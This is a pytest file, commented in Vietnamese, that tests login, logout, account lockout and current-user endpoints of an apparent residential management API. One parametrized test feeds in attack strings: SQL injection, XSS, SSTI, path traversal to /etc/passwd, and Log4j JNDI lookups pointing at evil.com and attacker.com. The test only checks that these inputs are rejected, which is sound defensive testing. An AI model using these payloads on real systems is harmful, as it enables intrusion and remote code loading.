"""
Unit & Integration Tests for US-28: Xác thực người dùng (Authentication - Login, Logout, Current User).
Black-Box Testing Specification:
- AC-28.1: Đăng nhập với username và password, trả về JWT Access Token cùng thông tin User & Role.
- AC-28.2: Khóa tài khoản tạm thời 15 phút sau 5 lần nhập sai mật khẩu liên tiếp (HTTP 423 ACCOUNT_LOCKED).
- Tự động mở khóa khi thời gian 15 phút kết thúc.
- Reset bộ đếm số lần sai khi đăng nhập đúng.
- Không phân biệt chữ hoa, chữ thường và khoảng trắng đầu cuối trong username.
- Endpoint Logout (POST /api/v1/auth/logout): HTTP 204 No Content khi có token hợp lệ.
- Endpoint Me (GET /api/v1/auth/me): Trả về thông tin người dùng hiện tại kèm vai trò.
"""

from datetime import datetime, timedelta, timezone
import pytest
from sqlalchemy import select
from app.core.config import settings
from app.core.security import create_access_token, decode_access_token
from app.models.user import User


# =====================================================================
# 1. KIỂM THỬ ĐĂNG NHẬP THÀNH CÔNG (HAPPY PATHS - 4 SEEDED USERS)
# =====================================================================

@pytest.mark.parametrize("username, password, expected_id, expected_full_name, expected_role, expected_household_id", [
    ("admin_test", "AdminPass123!", 1, "Quản Trị Viên Test", "ADMIN", None),
    ("accountant_test", "AccPass123!", 2, "Kế Toán Test", "ACCOUNTANT", None),
    ("resident_101", "ResPass123!", 3, "Cư Dân Hộ 101", "RESIDENT", 101),
    ("resident_102", "ResPass123!", 4, "Cư Dân Hộ 102", "RESIDENT", 102),
])
def test_login_success_seeded_users(
    client,
    db_session,
    username,
    password,
    expected_id,
    expected_full_name,
    expected_role,
    expected_household_id
):
    """
    Đăng nhập thành công với cả 4 tài khoản mẫu:
    - HTTP 200 OK
    - Cấu trúc LoginResponse: token, token_type Bearer, expires_in 28800 (8 tiếng)
    - Thông tin user: id, username, full_name, role.code, household_id, is_active
    - Database: failed_login_count = 0, locked_until is None, last_login_at được cập nhật
    """
    response = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": username, "password": password}
    )
    assert response.status_code == 200
    data = response.json()

    assert "token" in data and len(data["token"]) > 0
    assert data["token_type"] == "Bearer"
    assert data["expires_in"] == settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60

    user_info = data["user"]
    assert user_info["id"] == expected_id
    assert user_info["username"] == username
    assert user_info["full_name"] == expected_full_name
    assert user_info["role"]["code"] == expected_role
    assert user_info["household_id"] == expected_household_id
    assert user_info["is_active"] is True

    # Giải mã JWT kiểm tra claims
    decoded = decode_access_token(data["token"])
    assert decoded["sub"] == str(expected_id)
    assert decoded["username"] == username
    assert decoded["role"] == expected_role

    # Kiểm tra database cập nhật last_login_at và reset bộ đếm
    user_db = db_session.execute(select(User).where(User.id == expected_id)).scalar_one()
    assert user_db.failed_login_count == 0
    assert user_db.locked_until is None
    assert user_db.last_login_at is not None


# =====================================================================
# 2. KIỂM THỬ KHÔNG PHÂN BIỆT HOA THƯỜNG & LOẠI BỎ KHOẢNG TRẮNG
# =====================================================================

@pytest.mark.parametrize("input_username, password, expected_normalized", [
    ("admin_test", "AdminPass123!", "admin_test"),
    ("ADMIN_TEST", "AdminPass123!", "admin_test"),
    ("Admin_Test", "AdminPass123!", "admin_test"),
    ("  admin_test  ", "AdminPass123!", "admin_test"),
    ("\tadmin_test\n", "AdminPass123!", "admin_test"),
    ("aDmIn_tEsT", "AdminPass123!", "admin_test"),
    ("ACCOUNTANT_TEST", "AccPass123!", "accountant_test"),
    ("  accountant_test  ", "AccPass123!", "accountant_test"),
    ("Accountant_Test", "AccPass123!", "accountant_test"),
    ("AcCoUnTaNt_TeSt", "AccPass123!", "accountant_test"),
    ("RESIDENT_101", "ResPass123!", "resident_101"),
    ("  resident_101  ", "ResPass123!", "resident_101"),
    ("Resident_101", "ResPass123!", "resident_101"),
    ("RESIDENT_102", "ResPass123!", "resident_102"),
    ("  resident_102  ", "ResPass123!", "resident_102"),
])
def test_login_case_insensitivity_and_whitespace(client, input_username, password, expected_normalized):
    """Tên đăng nhập không phân biệt hoa thường và tự động loại bỏ khoảng trắng."""
    response = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": input_username, "password": password}
    )
    assert response.status_code == 200
    assert response.json()["user"]["username"] == expected_normalized


# =====================================================================
# 3. KIỂM THỬ NHẬP SAI MẬT KHẨU & TÀI KHOẢN KHÔNG TỒN TẠI (HTTP 401)
# =====================================================================

@pytest.mark.parametrize("username, wrong_password", [
    ("admin_test", "WrongPass123!"),
    ("admin_test", "adminpass123!"),  # Sai hoa thường mật khẩu
    ("admin_test", "AdminPass123"),   # Thiếu ký tự đặc biệt
    ("accountant_test", "AccPass999!"),
    ("accountant_test", "wrong_password"),
    ("resident_101", "ResPass999!"),
    ("resident_101", "12345678aA"),
    ("resident_102", "ResPass102!"),
    ("resident_102", "invalid_resident_pwd"),
    ("admin_test", "AdminPass123! "), # Thừa space mật khẩu
])
def test_login_wrong_password_under_5_attempts(client, db_session, username, wrong_password):
    """Sai mật khẩu: Trả về HTTP 401 INVALID_CREDENTIALS và tăng biến đếm failed_login_count."""
    response = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": username, "password": wrong_password}
    )
    assert response.status_code == 401
    err = response.json()
    assert err["code"] == "INVALID_CREDENTIALS"
    assert "còn 4 lần thử" in err["message"]

    user_db = db_session.execute(select(User).where(User.username == username)).scalar_one()
    assert user_db.failed_login_count == 1


@pytest.mark.parametrize("nonexistent_username", [
    "ghost_user",
    "super_admin",
    "root",
    "administrator",
    "resident_103",
    "resident_999",
    "accountant_99",
    "treasurer_1",
    "user_not_in_system",
    "bluemoon_guest",
])
def test_login_nonexistent_users(client, nonexistent_username):
    """Tên đăng nhập không tồn tại: Trả về HTTP 401 INVALID_CREDENTIALS (chống enumeration)."""
    response = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": nonexistent_username, "password": "Password123!"}
    )
    assert response.status_code == 401
    assert response.json()["code"] == "INVALID_CREDENTIALS"


# =====================================================================
# 4. KIỂM THỬ PAYLOAD BẤT THƯỜNG & TẤN CÔNG BẢO MẬT (SQLi, XSS, SSTI)
# =====================================================================

@pytest.mark.parametrize("malicious_user, malicious_pwd", [
    ("' OR '1'='1", "AdminPass123!"),
    ("admin_test'--", "AdminPass123!"),
    ("' UNION SELECT null, null, null--", "password"),
    ("<script>alert('xss')</script>", "AdminPass123!"),
    ("<img src=x onerror=alert(1)>", "AdminPass123!"),
    ("{{7*7}}", "AdminPass123!"),
    ("${jndi:ldap://evil.com/x}", "AdminPass123!"),
    ("../../../../etc/passwd", "AdminPass123!"),
    ("admin\x00test", "AdminPass123!"),
    ("👤🔒🔑", "AdminPass123!"),
    ("admin_test", "' OR '1'='1"),
    ("admin_test", "<script>alert(1)</script>"),
    ("admin_test", "${jndi:ldap://attacker.com/exploit}"),
    ("admin_test", "{{7*7}}SSTI"),
    ("admin_test", "\x00\x01\x02"),
])
def test_login_malicious_security_payloads(client, malicious_user, malicious_pwd):
    """Kiểm thử ứng dụng an toàn trước các payload SQL Injection, XSS, SSTI, Log4j, null byte."""
    response = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": malicious_user, "password": malicious_pwd}
    )
    assert response.status_code == 401
    assert response.json()["code"] == "INVALID_CREDENTIALS"


# =====================================================================
# 5. KIỂM THỬ LỖI DỮ LIỆU ĐẦU VÀO (HTTP 400 VALIDATION_ERROR)
# =====================================================================

@pytest.mark.parametrize("invalid_body", [
    {"username": "admin_test"},  # Thiếu password
    {"password": "AdminPass123!"},  # Thiếu username
    {},  # Body rỗng
    {"username": None, "password": "AdminPass123!"},  # username null
    {"username": "admin_test", "password": None},  # password null
    {"username": None, "password": None},  # cả hai null
    {"username": 12345, "password": "AdminPass123!"},  # username kiểu int
    {"username": "admin_test", "password": 12345},  # password kiểu int
    {"username": ["admin_test"], "password": "AdminPass123!"},  # username kiểu list
    {"username": "admin_test", "password": ["AdminPass123!"]},  # password kiểu list
    {"username": {"user": "admin_test"}, "password": "AdminPass123!"},  # username kiểu dict
    {"username": "admin_test", "password": {"secret": "pass"}},  # password kiểu dict
    {"username": True, "password": "AdminPass123!"},  # username kiểu bool
    {"username": "admin_test", "password": False},  # password kiểu bool
    {"username": "A" * 10000},  # Chuỗi cực lớn thiếu password
    {"password": "A" * 10000},  # Chuỗi cực lớn thiếu username
])
def test_login_validation_errors(client, invalid_body):
    """Kiểm thử payload sai định dạng dữ liệu trả về HTTP 400 VALIDATION_ERROR kèm details."""
    response = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json=invalid_body
    )
    assert response.status_code == 400
    err = response.json()
    assert err["code"] == "VALIDATION_ERROR"
    assert len(err["details"]) > 0


# =====================================================================
# 6. KIỂM THỬ CHUYỂN ĐỔI TRẠNG THÁI KHÓA VÀ MỞ KHÓA TÀI KHOẢN (AC-28.2)
# =====================================================================

def test_account_lockout_after_5_failed_attempts(client, db_session):
    """
    AC-28.2: Nhập sai mật khẩu liên tiếp 5 lần -> Khóa tài khoản 15 phút.
    Lần thứ 5 trả về HTTP 423 ACCOUNT_LOCKED, locked_until được thiết lập.
    """
    for i in range(1, 5):
        res = client.post(
            f"{settings.API_V1_STR}/auth/login",
            json={"username": "admin_test", "password": "WrongPassword!"}
        )
        assert res.status_code == 401
        assert res.json()["code"] == "INVALID_CREDENTIALS"

    # Lần thứ 5 sai -> Khóa tài khoản
    res_5th = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": "admin_test", "password": "WrongPassword!"}
    )
    assert res_5th.status_code == 423
    err = res_5th.json()
    assert err["code"] == "ACCOUNT_LOCKED"
    assert "15 phút" in err["message"]

    # Kiểm tra database ghi nhận locked_until và count = 5
    user_db = db_session.execute(select(User).where(User.username == "admin_test")).scalar_one()
    assert user_db.failed_login_count == 5
    assert user_db.locked_until is not None


def test_login_while_account_is_locked_with_correct_password(client, db_session):
    """Khi tài khoản đang bị khóa, dù nhập đúng mật khẩu vẫn trả về HTTP 423 ACCOUNT_LOCKED."""
    now = datetime.now(timezone.utc)
    user_db = db_session.execute(select(User).where(User.username == "admin_test")).scalar_one()
    user_db.locked_until = now + timedelta(minutes=15)
    user_db.failed_login_count = 5
    db_session.commit()

    response = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": "admin_test", "password": "AdminPass123!"}
    )
    assert response.status_code == 423
    assert response.json()["code"] == "ACCOUNT_LOCKED"


def test_login_while_account_is_locked_with_wrong_password(client, db_session):
    """Khi tài khoản đang bị khóa, nhập sai mật khẩu cũng trả về HTTP 423 ACCOUNT_LOCKED."""
    now = datetime.now(timezone.utc)
    user_db = db_session.execute(select(User).where(User.username == "admin_test")).scalar_one()
    user_db.locked_until = now + timedelta(minutes=15)
    user_db.failed_login_count = 5
    db_session.commit()

    response = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": "admin_test", "password": "TotallyWrongPassword!"}
    )
    assert response.status_code == 423
    assert response.json()["code"] == "ACCOUNT_LOCKED"


def test_login_auto_unlock_after_lockout_duration_expired(client, db_session):
    """Khi thời gian khóa 15 phút đã trôi qua, tài khoản tự động mở khóa khi đăng nhập đúng."""
    past = datetime.now(timezone.utc) - timedelta(minutes=1)
    user_db = db_session.execute(select(User).where(User.username == "admin_test")).scalar_one()
    user_db.locked_until = past
    user_db.failed_login_count = 5
    db_session.commit()

    response = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": "admin_test", "password": "AdminPass123!"}
    )
    assert response.status_code == 200

    # Kiểm tra trạng thái đã được reset về bình thường
    user_db = db_session.execute(select(User).where(User.username == "admin_test")).scalar_one()
    assert user_db.locked_until is None
    assert user_db.failed_login_count == 0


@pytest.mark.parametrize("wrong_attempts", [1, 2, 3, 4])
def test_successful_login_resets_failed_counter(client, db_session, wrong_attempts):
    """Đã nhập sai 1..4 lần, lần tiếp theo nhập đúng -> Reset failed_login_count về 0."""
    for _ in range(wrong_attempts):
        client.post(
            f"{settings.API_V1_STR}/auth/login",
            json={"username": "admin_test", "password": "WrongPassword!"}
        )

    user_db = db_session.execute(select(User).where(User.username == "admin_test")).scalar_one()
    assert user_db.failed_login_count == wrong_attempts

    # Đăng nhập đúng mật khẩu
    res = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": "admin_test", "password": "AdminPass123!"}
    )
    assert res.status_code == 200

    user_db = db_session.execute(select(User).where(User.username == "admin_test")).scalar_one()
    assert user_db.failed_login_count == 0


@pytest.mark.parametrize("username, password", [
    ("admin_test", "AdminPass123!"),
    ("accountant_test", "AccPass123!"),
    ("resident_101", "ResPass123!",),
    ("resident_102", "ResPass123!",),
])
def test_login_disabled_account(client, db_session, username, password):
    """Tài khoản có is_active = False -> Trả về HTTP 403 ACCOUNT_DISABLED."""
    user_db = db_session.execute(select(User).where(User.username == username)).scalar_one()
    user_db.is_active = False
    db_session.commit()

    response = client.post(
        f"{settings.API_V1_STR}/auth/login",
        json={"username": username, "password": password}
    )
    assert response.status_code == 403
    err = response.json()
    assert err["code"] == "ACCOUNT_DISABLED"


# =====================================================================
# 7. KIỂM THỬ ĐĂNG XUẤT (POST /api/v1/auth/logout)
# =====================================================================

@pytest.mark.parametrize("user_id, username, role", [
    (1, "admin_test", "ADMIN"),
    (2, "accountant_test", "ACCOUNTANT"),
    (3, "resident_101", "RESIDENT"),
    (4, "resident_102", "RESIDENT"),
])
def test_logout_success_seeded_users(client, user_id, username, role):
    """Đăng xuất hợp lệ kèm Bearer Token trả về HTTP 204 No Content."""
    token = create_access_token({"sub": str(user_id), "username": username, "role": role})
    response = client.post(
        f"{settings.API_V1_STR}/auth/logout",
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 204
    assert response.content == b""


@pytest.mark.parametrize("header_value", [
    None,
    "Bearer",
    "Bearer ",
    "Bearer   ",
    "bearer ",
    "Basic dXNlcjpwYXNz",
    "Token 12345",
    "Bearer invalid_token",
    "Bearer eyJhbGciOiJIUzI1NiJ9",
    "Bearer null",
    "CustomAuth header",
    "Bearer 12345",
])
def test_logout_unauthenticated_or_malformed(client, header_value):
    """Đăng xuất thiếu hoặc sai Bearer Token trả về HTTP 401 UNAUTHENTICATED."""
    headers = {"Authorization": header_value} if header_value is not None else {}
    response = client.post(f"{settings.API_V1_STR}/auth/logout", headers=headers)
    assert response.status_code == 401
    assert response.json()["code"] == "UNAUTHENTICATED"


def test_logout_idempotency_repeated_calls(client, auth_headers_admin):
    """Đăng xuất nhiều lần vẫn hoạt động an toàn và trả về 204."""
    res1 = client.post(f"{settings.API_V1_STR}/auth/logout", headers=auth_headers_admin)
    assert res1.status_code == 204

    res2 = client.post(f"{settings.API_V1_STR}/auth/logout", headers=auth_headers_admin)
    assert res2.status_code in (204, 401)


# =====================================================================
# 8. KIỂM THỬ THÔNG TIN TÀI KHOẢN HIỆN TẠI (GET /api/v1/auth/me)
# =====================================================================

@pytest.mark.parametrize("user_id, username, expected_full_name, expected_role, expected_household_id", [
    (1, "admin_test", "Quản Trị Viên Test", "ADMIN", None),
    (2, "accountant_test", "Kế Toán Test", "ACCOUNTANT", None),
    (3, "resident_101", "Cư Dân Hộ 101", "RESIDENT", 101),
    (4, "resident_102", "Cư Dân Hộ 102", "RESIDENT", 102),
])
def test_get_me_success_seeded_users(
    client,
    user_id,
    username,
    expected_full_name,
    expected_role,
    expected_household_id
):
    """GET /auth/me trả về đúng thông tin tài khoản đang đăng nhập kèm Role schema."""
    token = create_access_token({"sub": str(user_id), "username": username, "role": expected_role})
    response = client.get(
        f"{settings.API_V1_STR}/auth/me",
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200
    data = response.json()
    assert data["id"] == user_id
    assert data["username"] == username
    assert data["full_name"] == expected_full_name
    assert data["role"]["code"] == expected_role
    assert data["household_id"] == expected_household_id
    assert data["is_active"] is True


@pytest.mark.parametrize("header_value", [
    None,
    "Bearer",
    "Bearer ",
    "Basic YWRtaW46cGFzcw==",
    "Token 12345",
    "Bearer invalid.jwt.token",
    "Bearer eyJhbGciOiJIUzI1NiJ9.invalid",
    "Bearer null",
    "CustomAuth token",
    "Bearer 12345",
])
def test_get_me_unauthenticated_or_malformed(client, header_value):
    """GET /auth/me thiếu token hoặc token hỏng trả về HTTP 401 UNAUTHENTICATED."""
    headers = {"Authorization": header_value} if header_value is not None else {}
    response = client.get(f"{settings.API_V1_STR}/auth/me", headers=headers)
    assert response.status_code == 401
    assert response.json()["code"] == "UNAUTHENTICATED"


def test_get_me_disabled_account(client, db_session):
    """Tài khoản có token hợp lệ nhưng bị vô hiệu hóa (is_active = False) -> Trả về HTTP 401 UNAUTHENTICATED."""
    token = create_access_token({"sub": "1", "username": "admin_test", "role": "ADMIN"})

    user_db = db_session.execute(select(User).where(User.id == 1)).scalar_one()
    user_db.is_active = False
    db_session.commit()

    response = client.get(
        f"{settings.API_V1_STR}/auth/me",
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 401
    assert response.json()["code"] == "UNAUTHENTICATED"
